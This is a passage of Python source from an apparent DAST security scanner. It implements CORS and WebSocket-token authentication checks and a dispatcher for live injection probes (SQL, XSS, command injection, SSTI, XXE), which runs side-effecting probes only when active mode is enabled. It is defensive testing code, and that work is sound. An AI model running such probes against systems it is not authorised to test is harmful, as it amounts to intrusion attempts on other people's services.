            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=str(resp.request.url), method="GET",
            note="Response sets Access-Control-Allow-Origin: * together with "
                 "Access-Control-Allow-Credentials: true — an invalid combination most browsers reject, "
                 "but still a real misconfiguration worth fixing",
            confidence=0.5, evidence_type="reflection", proof=cors_proof,
        )

    return DynamicFinding(
        control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="Response did not reflect the probe Origin back in Access-Control-Allow-Origin",
        confidence=0.5, evidence_type="reflection", proof=cors_proof,
    )


# V4.4.3/V4.4.4 — path shape a WebSocket/realtime token-issuance endpoint
# conventionally uses ("/ws/token", "/websocket-ticket", "/realtime/auth",
# "/socket/token", ...). Same regex weight class as
# _PUBLIC_BY_DEFINITION_PATH_RE above: a heuristic gate, not a
# framework-aware router. A URL that doesn't match is simply not what these
# two checks are testing and degrades to NOT_TESTED at low confidence, the
# same "doesn't apply here" treatment CSRF/open-redirect give a page with no
# matching form/param.
_WEBSOCKET_TOKEN_PATH_RE = re.compile(
    r"/(?:ws|websocket|websockets|socket|realtime|stream)s?[-_/]?(?:token|ticket|auth|handshake)s?(?:/|$|\?)"
    r"|/(?:token|ticket|auth)s?[-_/]?(?:ws|websocket|websockets|socket|realtime)s?(?:/|$|\?)",
    re.IGNORECASE,
)

_WS_TOKEN_KEY_NAMES = {
    "wstoken", "websockettoken", "sockettoken", "realtimetoken", "connectiontoken",
    "channeltoken", "ticket", "wsticket", "socketticket", "token", "accesstoken",
}


def _extract_ws_token_from_json(data) -> Optional[str]:
    """Same recursive shape-search session.py's _extract_bearer_token_from_json
    uses for login responses, kept as its own copy here (different key
    vocabulary — ticket/wsToken/... rather than accessToken/jwt/... — so
    folding them into one shared function would just mean threading a
    key-set parameter through session.py's auth-critical path for a
    DAST-only need)."""
    if isinstance(data, dict):
        for key, value in data.items():
            normalized = key.lower().replace("_", "").replace("-", "")
            if isinstance(value, str) and value and normalized in _WS_TOKEN_KEY_NAMES:
                return value
        for value in data.values():
            found = _extract_ws_token_from_json(value)
            if found:
                return found
    elif isinstance(data, list):
        for item in data:
            found = _extract_ws_token_from_json(item)
            if found:
                return found
    return None


async def _check_websocket_token_requires_auth(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """V4.4.4 — a WebSocket token must only be obtainable after the client
    already has an authenticated HTTPS session. Path-shape-gated (see
    _WEBSOCKET_TOKEN_PATH_RE): fetches target_url once through the scan's
    real authenticated session and once with none at all
    (DastSession.request_unauthenticated) — same before/after comparison
    _check_unauthenticated_access uses for V8.2.1. Only decisive when the
    scan actually configured an authenticated session AND the authenticated
    response really does look like a token/ticket issuance (a JSON field
    named token/ticket/... with a non-empty string value) — otherwise this
    degrades honestly to NOT_TESTED rather than guessing."""
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    if not _WEBSOCKET_TOKEN_PATH_RE.search(urlsplit(target_url).path):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="URL doesn't look like a WebSocket/realtime token-issuance endpoint",
            confidence=0.15,
        )
    if not session.is_authenticated:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_CONFIGURED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="Scan has no authenticated session configured — nothing to compare the "
                 "unauthenticated request against",
            confidence=0.2,
        )

    try:
        auth_resp = await session.request("GET", target_url)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note=f"Could not fetch the endpoint through the authenticated session: {session.redact(str(exc))}",
            confidence=0.2,
        )
    auth_token = None
    if auth_resp.status_code < 300:
        try:
            auth_token = _extract_ws_token_from_json(auth_resp.json())
        except ValueError:
            auth_token = None
    if not auth_token:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="Path matched a WebSocket-token URL shape, but the authenticated response "
                 "didn't return a recognizable token/ticket field — can't confirm this is a "
                 "real token-issuance endpoint",
            confidence=0.2, proof=_response_proof(session, auth_resp),
        )

    try:
        anon_resp = await session.request_unauthenticated("GET", target_url)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note=f"Authenticated request confirmed a token endpoint, but the unauthenticated "
                 f"follow-up failed: {session.redact(str(exc))}", confidence=0.2,
        )
    anon_token = None
    if anon_resp.status_code < 300:
        try:
            anon_token = _extract_ws_token_from_json(anon_resp.json())
        except ValueError:
            anon_token = None

    proof = _response_proof(session, anon_resp, authenticated_status=auth_resp.status_code)
    if anon_token:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="A request with no authenticated session still received a WebSocket "
                 "token/ticket from this endpoint",
            confidence=0.6, evidence_type="response_diff", proof=proof,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="The endpoint issued a token through the authenticated session but not to the "
             "equivalent unauthenticated request",
        confidence=0.5, evidence_type="response_diff", proof=proof,
    )


async def _check_websocket_token_not_derived_from_session(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """V4.4.3 — a WebSocket token must be a dedicated value, not the HTTP
    session token/cookie relabeled. Path-shape-gated like V4.4.4's sibling
    check above; fetches target_url through the authenticated session and
    compares the extracted token verbatim against every cookie value and
    every auth header value this same session is using (session.
    browser_auth_state() — already exports exactly this shape for the
    browser crawler). An exact match is real, direct evidence of reuse;
    anything short of that (e.g. cryptographic derivation from the same
    secret) isn't detectable this way and this check makes no claim about
    it — a clean PASS here is deliberately weaker evidence than the FAIL
    and never passes the control on its own (see
    HYBRID_ATTESTATION_DYNAMIC_ELIGIBLE_CONTROLS in asvs_service.py)."""
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    if not _WEBSOCKET_TOKEN_PATH_RE.search(urlsplit(target_url).path):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="URL doesn't look like a WebSocket/realtime token-issuance endpoint",
            confidence=0.15,
        )
    if not session.is_authenticated:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_CONFIGURED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="Scan has no authenticated session configured — no HTTP session token to "
                 "compare against",
            confidence=0.2,
        )

    try:
        resp = await session.request("GET", target_url)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note=f"Could not fetch the endpoint: {session.redact(str(exc))}", confidence=0.2,
        )
    ws_token = None
    if resp.status_code < 300:
        try:
            ws_token = _extract_ws_token_from_json(resp.json())
        except ValueError:
            ws_token = None
    if not ws_token:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="Path matched a WebSocket-token URL shape, but the response didn't return a "
                 "recognizable token/ticket field",
            confidence=0.2, proof=_response_proof(session, resp),
        )

    cookies, headers = session.browser_auth_state()
    http_session_values = {c["value"] for c in cookies if c.get("value")}
    for header_value in headers.values():
        if not header_value:
            continue
        http_session_values.add(header_value)
        if header_value.lower().startswith("bearer "):
            http_session_values.add(header_value[len("Bearer "):])
    http_session_values.discard("")

    reused = ws_token in http_session_values
    proof = _response_proof(session, resp, ws_token_matches_http_session_value=reused)
    if reused:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="The WebSocket token is identical to the HTTP session's own cookie/bearer "
                 "value — not a dedicated token, just the HTTP session token relabeled",
            confidence=0.65, evidence_type="response_diff", proof=proof,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="The WebSocket token's value differs from every HTTP session cookie/auth-header "
             "value this scan observed (doesn't rule out the token being cryptographically "
             "derived from the same session secret — only exact reuse is detectable this way)",
        confidence=0.4, evidence_type="response_diff", proof=proof,
    )


_CHECK_FUNCTIONS = {
    "DOUBLE_DECODE_BYPASS": _check_double_decode_bypass,
    "CRLF_HEADER_REFLECTION": _check_crlf_header_reflection,
    "OPEN_REDIRECT_LIVE": _check_open_redirect_live,
    "REQUEST_SMUGGLING": _check_request_smuggling,
    "CSRF_TOKEN_NOT_VALIDATED": _check_csrf_token_validation,
    "UNAUTHENTICATED_ACCESS_ALLOWED": _check_unauthenticated_access,
    "COMMAND_INJECTION_LIVE": _check_command_injection,
    "SSTI_LIVE": _check_ssti,
    "XXE_LIVE": _check_xxe,
    "NOSQL_INJECTION_LIVE": _check_nosql_injection,
    "CORS_MISCONFIG_LIVE": _check_cors_misconfiguration,
    "REFLECTED_XSS_LIVE": _check_reflected_xss,
    "SQL_INJECTION_LIVE": _check_sql_injection,
    "WEBSOCKET_TOKEN_UNAUTH_ISSUANCE": _check_websocket_token_requires_auth,
    "WEBSOCKET_TOKEN_DERIVED_FROM_SESSION": _check_websocket_token_not_derived_from_session,
}


# Checks that get the resolved route's real HTTP method (bridge.py's
# BridgeTarget.method) instead of the hardcoded "GET" every other check
# still uses. Deliberately narrow: UNAUTHENTICATED_ACCESS_ALLOWED sends
# exactly one authenticated + one anonymous request and compares status
# codes — using the route's real method just means that baseline request
# actually lands instead of 405ing on a POST-only route. Every payload/
# injection check (SQLI, XSS, command injection, SSTI, ...) fires several
# requests with different payloads as part of its own detection logic
# (timing oracles, differential responses) — repeating a *state-changing*
# request against a POST route as part of that (e.g. a money-transfer
# endpoint) would both fire real side effects multiple times and corrupt
# the comparison itself (the state changing between requests, not just the
# payload). Those stay GET-only until each one gets its own side-effect
# review, not as a blanket change here.
_METHOD_AWARE_CHECKS = {"UNAUTHENTICATED_ACCESS_ALLOWED"}


async def run_payload_checks(
    session: DastSession,
    target_urls,  # str | List[str] — a single URL (Phase 2A) or crawler-discovered URLs (Phase 3)
    rules: Optional[Dict[str, DynamicQueryRule]] = None,
    active_mode: bool = False,
    request_delay: float = 0.0,
    collaborator: Optional[CollaboratorServer] = None,
    method: str = "GET",
) -> List[DynamicFinding]:
    """request_delay: seconds to sleep before each check after the first
    real one (default 0.0 — no behavior change for direct/test callers).
    Same reasoning as crawler.py's crawl(): this loop is already strictly
    sequential, real scans (scan_service.py) pass a small nonzero delay to
    pace requests against the target; skipped (no-request) checks don't
    count towards "the first one" or get delayed themselves.

    collaborator: the scan-wide out-of-band listener (scan_service.py's
    _run_dynamic_checks creates one per dynamic run, not per-check — see
    collaborator.py). Passed uniformly to every check function so any of
    them can call collaborator.new_token()/oracles.oob_oracle() to confirm
    an out-of-band-provable class (XXE, blind RCE, SSTI, ...), the same way
    ssrf_probe.py already does outside this loop. None when active_mode is
    off or the scan didn't request one — existing checks ignore the
    parameter entirely, so this is a no-op for all of them today.

    method: the route's real HTTP method when known (bridge.py resolved it
    from the route decorator) — see _METHOD_AWARE_CHECKS above for which
    checks actually use it. Default "GET" preserves every existing caller's
    behavior exactly (the crawler-driven sweep and dynamic-only scans never
    pass this — they have no route-decorator info to resolve it from)."""
    if rules is None:
        rules = load_dynamic_queries()
    urls = [target_urls] if isinstance(target_urls, str) else list(target_urls)

    findings: List[DynamicFinding] = []
    made_a_request = False
    for url in urls:
        for rule_id, check_func in _CHECK_FUNCTIONS.items():
            rule = rules.get(rule_id)
            if rule is None or rule.check_type != "payload":
                continue
            if rule.requires_active_mode and not active_mode:
                findings.append(DynamicFinding(
                    control_id=(rule.asvs_controls[0] if rule.asvs_controls else rule_id),
                    verdict=Verdict.SKIPPED_REQUIRES_ACTIVE_AUTHORIZATION, rule_id=rule_id,
                    url=url, method="GET", severity=rule.severity,
                    note="This check has side effects and active_mode was not enabled for this scan",
                    confidence=1.0,
                ))
                continue
            if made_a_request and request_delay:
                await asyncio.sleep(request_delay)
            made_a_request = True
            try:
                if rule_id in _METHOD_AWARE_CHECKS:
                    findings.append(await check_func(session, url, rule, method=method, collaborator=collaborator))
                else:
                    findings.append(await check_func(session, url, rule, collaborator=collaborator))
            except Exception as exc:
                logger.warning(f"DAST payload check {rule_id} raised unexpectedly: {exc}")
                findings.append(DynamicFinding(
                    control_id=(rule.asvs_controls[0] if rule.asvs_controls else rule_id),
                    verdict=Verdict.NOT_TESTED, rule_id=rule_id, url=url, method="GET",
                    severity=rule.severity, note=f"Check raised an unexpected error: {session.redact(str(exc))}",
                    confidence=0.2,
                ))
    return findings
